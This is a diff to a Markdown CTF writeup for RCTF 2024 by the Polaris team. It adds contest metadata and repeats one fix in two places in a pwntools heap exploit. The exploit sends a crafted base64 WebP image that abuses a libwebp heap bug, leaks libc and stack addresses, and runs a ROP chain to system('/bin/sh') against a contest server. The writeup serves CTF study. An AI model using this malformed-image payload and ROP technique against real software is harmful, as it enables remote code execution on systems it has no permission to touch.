@@ -84,6 +84,8 @@ prerequisites:
 - libwebp heap 漏洞原理
 - Spring LDAP JNDI 注入链
 - SQL REGEXP 倒序爆破
+contest_normalized: "RCTF"
+contest_year: 2024
 ---
 # RCTF 2024 Writeup  –Polaris战队
 
@@ -279,9 +281,9 @@ def delete(index):    sh.sendlineafter(b'5. Edit feedbackn> ', b'4')    sh.s
 def edit(index, content):    sh.sendlineafter(b'5. Edit feedbackn> ', b'5')    sh.sendlineafter(b'> ', str(index).encode())    sh.sendlineafter(b'feedback:n', content)
 sh = remote('123.60.91.255', 10088)
 add(1, 0x43a0, b'aaaa')add(2, 0x20, b'bbbb')delete(2)add(2, 0x10, b'bbbb')delete(2)add(2, 0x20, b'bbbb')
-delete(1)sh.sendlineafter(b'5. Edit feedbackn> ', b'1')sh.sendlineafter(b'base64:n', b'UklGRlYBAABXRUJQVlA4TEkBAAAvAAAAABoPwAAAANHc1gcAAAAAAAAAAAAAAAAAAAAAAAAAAACgqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq2bdt/7nseQNEWACS1rTHXBgAAAAAAAAAAAAAAAAAAAAAAAABAVVVVVVVVVVVVVVVVVVVVVVVVVVXVqqqqqqqqqqqqqqqqqqqqqqqqqqrOff97AEVbAJDUtsZcGwAAAAAAAAAAAAAAAAAAAAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVq6qqqqqqqqqqqqqqqqqqqqqqqqo69/3vARRtAUBS2xpzbQAAAAAAAAAAAAAAAAAAAAAAAAAAVFVVVVVVVVVVVVVVVVVVVVVVVVVVraqqqqqqqqqqqqqqqqqqqqqqqqrq3Pe/BwAAAMmJJKSqumeSAAAA7N79q6qqAgA= ')
+delete(1)sh.sendlineafter(b'5. Edit feedbackn> ', b'1')sh.sendlineafter(b'base64:n', b'UklGRlYBAABXRUJQVlA4TEkBAAAvAAAAABoPwAAAANHc1gcAAAAAAAAAAAAAAAAAAAAAAAAAAACgqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq2bdt/7nseQNEWACS1rTHXBgAAAAAAAAAAAAAAAAAAAAAAAABAVVVVVVVVVVVVVVVVVVVVVVVVVVXVqqqqqqqqqqqqqqqqqqqqqqqqqqrOff97AEVbAJDUtsZcGwAAAAAAAAAAAAAAAAAAAAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVq6qqqqqqqqqqqqqqqqqqqqqqqqo69/3vARRtAUBS2xpzbQAAAAAAAAAAAAAAAAAAAAAAAAAAVFVVVVVVVVVVVVVVVVVVVVVVVVVVraqqqqqqqqqqqqqqqqqqqqqqqqrq3Pe/BwAAAMmJJKSqumeSAAAA7N79q6qqAgA=\\x00')
 add(1, 0x100, b'bbbb')add(1, 0x100, b'bbbb')show(1)
-sh.recvuntil(b'bbbbn   ')libc_addr = u64(sh.recvn(8)) - 0x21ace0success('libc_addr:' + hex(libc_addr))
+sh.recvuntil(b'bbbbn\\x00\\x00\\x00')libc_addr = u64(sh.recvn(8)) - 0x21ace0success('libc_addr:' + hex(libc_addr))
 edit(2, b'c' * 0x30 + p64(libc_addr + 0x222200) + p64(8))show(1)sh.recvuntil(b'Feedback:n')stack_addr = u64(sh.recvn(8))success('stack_addr:' + hex(stack_addr))
 edit(2, b'c' * 0x30 + p64(stack_addr - 0x1a0) + p64(0x100))
 edit(1, flat([    libc_addr + 0x0000000000029139, #: ret;    libc_addr + 0x000000000002a3e5, #: pop rdi; ret;    libc_addr + 0x1d8678, # "/bin/sh"    libc_addr + 0x50d70, # system]))
@@ -533,9 +535,9 @@ def delete(index):    sh.sendlineafter(b'5. Edit feedbackn> ', b'4')    sh.s
 def edit(index, content):    sh.sendlineafter(b'5. Edit feedbackn> ', b'5')    sh.sendlineafter(b'> ', str(index).encode())    sh.sendlineafter(b'feedback:n', content)
 sh = remote('123.60.91.255', 10088)
 add(1, 0x43a0, b'aaaa')add(2, 0x20, b'bbbb')delete(2)add(2, 0x10, b'bbbb')delete(2)add(2, 0x20, b'bbbb')
-delete(1)sh.sendlineafter(b'5. Edit feedbackn> ', b'1')sh.sendlineafter(b'base64:n', b'UklGRlYBAABXRUJQVlA4TEkBAAAvAAAAABoPwAAAANHc1gcAAAAAAAAAAAAAAAAAAAAAAAAAAACgqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq2bdt/7nseQNEWACS1rTHXBgAAAAAAAAAAAAAAAAAAAAAAAABAVVVVVVVVVVVVVVVVVVVVVVVVVVXVqqqqqqqqqqqqqqqqqqqqqqqqqqrOff97AEVbAJDUtsZcGwAAAAAAAAAAAAAAAAAAAAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVq6qqqqqqqqqqqqqqqqqqqqqqqqo69/3vARRtAUBS2xpzbQAAAAAAAAAAAAAAAAAAAAAAAAAAVFVVVVVVVVVVVVVVVVVVVVVVVVVVraqqqqqqqqqqqqqqqqqqqqqqqqrq3Pe/BwAAAMmJJKSqumeSAAAA7N79q6qqAgA= ')
+delete(1)sh.sendlineafter(b'5. Edit feedbackn> ', b'1')sh.sendlineafter(b'base64:n', b'UklGRlYBAABXRUJQVlA4TEkBAAAvAAAAABoPwAAAANHc1gcAAAAAAAAAAAAAAAAAAAAAAAAAAACgqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq2bdt/7nseQNEWACS1rTHXBgAAAAAAAAAAAAAAAAAAAAAAAABAVVVVVVVVVVVVVVVVVVVVVVVVVVXVqqqqqqqqqqqqqqqqqqqqqqqqqqrOff97AEVbAJDUtsZcGwAAAAAAAAAAAAAAAAAAAAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVq6qqqqqqqqqqqqqqqqqqqqqqqqo69/3vARRtAUBS2xpzbQAAAAAAAAAAAAAAAAAAAAAAAAAAVFVVVVVVVVVVVVVVVVVVVVVVVVVVraqqqqqqqqqqqqqqqqqqqqqqqqrq3Pe/BwAAAMmJJKSqumeSAAAA7N79q6qqAgA=\\x00')
 add(1, 0x100, b'bbbb')add(1, 0x100, b'bbbb')show(1)
-sh.recvuntil(b'bbbbn   ')libc_addr = u64(sh.recvn(8)) - 0x21ace0success('libc_addr:' + hex(libc_addr))
+sh.recvuntil(b'bbbbn\\x00\\x00\\x00')libc_addr = u64(sh.recvn(8)) - 0x21ace0success('libc_addr:' + hex(libc_addr))
 edit(2, b'c' * 0x30 + p64(libc_addr + 0x222200) + p64(8))show(1)sh.recvuntil(b'Feedback:n')stack_addr = u64(sh.recvn(8))success('stack_addr:' + hex(stack_addr))
 edit(2, b'c' * 0x30 + p64(stack_addr - 0x1a0) + p64(0x100))
 edit(1, flat([    libc_addr + 0x0000000000029139, #: ret;    libc_addr + 0x000000000002a3e5, #: pop rdi; ret;    libc_addr + 0x1d8678, # "/bin/sh"    libc_addr + 0x50d70, # system]))
